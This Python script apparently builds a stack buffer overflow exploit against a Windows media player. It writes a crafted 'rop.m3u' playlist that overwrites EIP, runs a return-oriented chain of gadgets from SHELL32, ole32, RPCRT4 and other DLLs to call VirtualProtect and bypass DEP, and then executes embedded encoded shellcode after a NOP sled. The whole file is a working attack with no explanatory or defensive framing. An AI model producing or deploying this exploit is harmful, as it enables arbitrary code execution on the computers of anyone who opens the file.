import struct

file = "rop.m3u"
eip =  struct.pack('<L',0x1002d415)

def create_rop_chain():
    rop_gadgets = [
        ###PUT STACK POINTER IN TO ESI AND EAX###
        0x763bf7cb,  # PUSH ESP # POP ESI # RETN [SHELL32.dll]  
        0x764f9784,  # XCHG EAX,ESI # RETN    ** [SHELL32.dll]
        0x750d6005,  # PUSH EAX # POP ESI # POP EBP # RETN 0x04    ** [MSCTF.dll]
        0x41414141,  # Filler (compensate)
        0x1001653D,  # ADD ESP,20 # RETN   [MSRMFilter03.dll]
        ###PARAMETERS FOR VirtualProtect()###
        #0x74871388,  # POINTER TO VirtualProtect()
        0x10032078,  # VirtualProtect
        0x41414141,  # Return Address
        0x42424242,  # lpAddress
        0x43434343,  # Size
        0x44444444,  # flNewProtect
        0x10035005,  # Writable address in MSRMfilter03.dll
        0x12121212,  # Padding
        0x12121212,  # Padding
        0x12121212,  # Padding
        ###MAKE EAX POINT TO SHELLCODE###
        0x7658edc8,  # ADD EAX,74 # RETN    ** [SHELL32.dll]
        ###DROP EAX IN PARAMETER ONE###
        0x75bdbc04,  # MOV DWORD PTR DS:[ESI+14],EAX # MOV EAX,ESI # POP ESI # RETN    ** [ole32.dll]
        0x12121212,  # padding
        ###GET EAX TO POINT TO SHELLCODE AGAIN AND DROP IN PARAMETER TWO###
        0x7651250d,  # PUSH EAX # POP ESI # RETN    ** [SHELL32.dll]
        0x7658edc8,  # ADD EAX,74 # RETN    ** [SHELL32.dll]
        0x752a3673,  # MOV DWORD PTR DS:[ESI+18],EAX # MOV EAX,ESI # POP ESI # RETN    ** [RPCRT4.dll]
        0x41414141,  # padding
        ###GET 400 IN TO PARAMETER 3###
        0x7651250d,  # PUSH EAX # POP ESI # RETN    ** [SHELL32.dll]
        0x76212a66,  # XOR EAX,EAX # RETN    ** [SHELL32.dll]
        0x760dfb97,  # ADD EAX,224 # RETN    ** [WININET.dll]
        0x760dfb97,  # ADD EAX,224 # RETN    ** [WININET.dll]
        0x75c47c70,  # MOV DWORD PTR DS:[ESI+1C],EAX # MOV EAX,ESI # POP ESI # RETN    ** [ole32.dll]
        0x41414141,  # padding
        ###GET 40 IN PARAMETER 4###
        0x7651250d,  # PUSH EAX # POP ESI # RETN    ** [SHELL32.dll]
        0x76212a66,  # XOR EAX,EAX # RETN    ** [SHELL32.dll]
        0x77307659,  # ADD EAX,40 # POP EBP # RETN    ** [ntdll.dll]
        0x41414141,  # padding
        0x752a364b,  # MOV DWORD PTR DS:[ESI+20],EAX # MOV EAX,ESI # POP ESI # RETN    ** [RPCRT4.dll]
        0x41414141,  # padding
        ###JUMP TO VirtualProtect()###
        0x75636344,  # ADD EAX,10 # RETN    ** [iertutil.dll]
        0x76490b51,  # MOV ESP,EAX # DEC ECX # RETN    ** [SHELL32.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

shellcode = (
"\xbb\x03\xa0\x25\xaf\xdb\xc3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x53\x31\x5a\x12\x83\xc2\x04\x03\x59\xae\xc7\x5a\xa1\x46\x85"
"\xa5\x59\x97\xea\x2c\xbc\xa6\x2a\x4a\xb5\x99\x9a\x18\x9b\x15"
"\x50\x4c\x0f\xad\x14\x59\x20\x06\x92\xbf\x0f\x97\x8f\xfc\x0e"
"\x1b\xd2\xd0\xf0\x22\x1d\x25\xf1\x63\x40\xc4\xa3\x3c\x0e\x7b"
"\x53\x48\x5a\x40\xd8\x02\x4a\xc0\x3d\xd2\x6d\xe1\x90\x68\x34"
"\x21\x13\xbc\x4c\x68\x0b\xa1\x69\x22\xa0\x11\x05\xb5\x60\x68"
"\xe6\x1a\x4d\x44\x15\x62\x8a\x63\xc6\x11\xe2\x97\x7b\x22\x31"
"\xe5\xa7\xa7\xa1\x4d\x23\x1f\x0d\x6f\xe0\xc6\xc6\x63\x4d\x8c"
"\x80\x67\x50\x41\xbb\x9c\xd9\x64\x6b\x15\x99\x42\xaf\x7d\x79"
"\xea\xf6\xdb\x2c\x13\xe8\x83\x91\xb1\x63\x29\xc5\xcb\x2e\x26"
"\x2a\xe6\xd0\xb6\x24\x71\xa3\x84\xeb\x29\x2b\xa5\x64\xf4\xac"
"\xca\x5e\x40\x22\x35\x61\xb1\x6b\xf2\x35\xe1\x03\xd3\x35\x6a"
"\xd3\xdc\xe3\x07\xdb\x7b\x5c\x3a\x26\x3b\x0c\xfa\x88\xd4\x46"
"\xf5\xf7\xc5\x68\xdf\x90\x6e\x95\xe0\x8f\x32\x10\x06\xc5\xda"
"\x74\x90\x71\x19\xa3\x29\xe6\x62\x81\x01\x80\x2b\xc3\x96\xaf"
"\xab\xc1\xb0\x27\x20\x06\x05\x56\x37\x03\x2d\x0f\xa0\xd9\xbc"
"\x62\x50\xdd\x94\x14\xf1\x4c\x73\xe4\x7c\x6d\x2c\xb3\x29\x43"
"\x25\x51\xc4\xfa\x9f\x47\x15\x9a\xd8\xc3\xc2\x5f\xe6\xca\x87"
"\xe4\xcc\xdc\x51\xe4\x48\x88\x0d\xb3\x06\x66\xe8\x6d\xe9\xd0"
"\xa2\xc2\xa3\xb4\x33\x29\x74\xc2\x3b\x64\x02\x2a\x8d\xd1\x53"
"\x55\x22\xb6\x53\x2e\x5e\x26\x9b\xe5\xda\x56\xd6\xa7\x4b\xff"
"\xbf\x32\xce\x62\x40\xe9\x0d\x9b\xc3\x1b\xee\x58\xdb\x6e\xeb"
"\x25\x5b\x83\x81\x36\x0e\xa3\x36\x36\x1b")

crash = "A" * 26075 + eip + "junk" + rop_chain + "\x90" * 70 + shellcode

exploit = open (file, "w")
exploit.write(crash)
exploit.close()